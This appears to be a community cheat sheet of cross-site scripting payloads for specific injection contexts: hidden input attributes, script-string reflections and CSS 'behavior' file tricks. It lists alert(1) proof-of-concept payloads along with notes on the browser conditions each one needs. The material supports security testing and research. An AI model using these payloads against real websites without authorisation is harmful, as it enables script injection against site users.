# About XSS Problems

This is a public cheat sheet to help you solve problems you might encounter while trying to XSS a target, you can contribute by telling me your problems or solutions. If you find a solution, make sure they work in one of the following browsers: Chrome, Firefox, IE/Edge (IE version 9 or above), Safari and Opera. This Cheat Sheet is never finished, so I might add more over time.

Extra solutions to solved problems are also welcome.

---

# Problems and Solutions

## Hidden Input fields

📝 **Problem**

```
<input type="hidden" value="[injection-point]">
```

Greater than (>) and Less than (<) are properly encoded, you can only add attributes to the input tag.

💡 **Solution(s):**

```
'"/autofocus/onfocus='alert(1)'x=
```

**Note:**

This only works if the input element is in the following form.

```
<input value="[injection-point]" type="hidden">
```

It's not very common but it does happen.

By [me](https://twitter.com/Karel_Origin).

💡

```
'"/onclick='alert(1)'/accesskey='X'
```

**Note:**

Requires you to press ALT+SHIFT+X on Windows/Linux or CTRL+ALT+X on OS X. (Only works in Firefox.)

By [PortSwigger](http://blog.portswigger.net/2015/11/xss-in-hidden-input-fields.html).

---

## Multiple reflections in a script context

📝 **Problem**

```
x = "[injection-point]"
y = "[injection-point]"
```

Double quotes are properly encoded, it's only possible to escape the string with %0A and escape quotes using \

**Note:**

The same parameter is used for both injection points.

Injecting "1" in parameter "x" will result in:

```
x = "1"
y = "1"
```

💡 **Solution(s):**

There is no solution to this problem yet.

Feel free to [contribute](https://github.com/karelorigin/XSS-Problems/issues/new)!

---

## CSS Injection to XSS

📝 **Problem**

```
<input style="[injection-point]">
```

**Note:**

Double quotes are properly encoded.


💡 **Solution(s):**

```
behavior: url(xss.htc)
```

Contents xss.htc:
```
<script>alert(1)</script>
```

**Note:**

xss.htc needs to be served as `text/x-component` and only works in docmode 9 which makes this payload pretty useless

💡

```
behavior: url(xss.txt)
```

Contents xss.txt:
```
<scriptlet>  
    <implements type="behavior"/>
    <script>alert(1)</script>
</scriptlet>  
```

**Note:**

This doesn't work Cross-Domain, which means that you need to be able to upload a file to the current domain. The file needs to be served with one of the following Content-Types.

1. text/html
1. text/plain
1. image/*
1. video/mpeg
1. video/avi

This technique won't work if the site uses the `X-Content-Type-Options: nosniff` or `Content-Disposition: attachment` header.

By [Filedescriptor](http://blog.innerht.ml/cascading-style-scripting/).

---

# Contribute

That's it! feel free to [submit](https://github.com/karelorigin/XSS-Problems/issues/new) an issue and help others with their XSS problems.
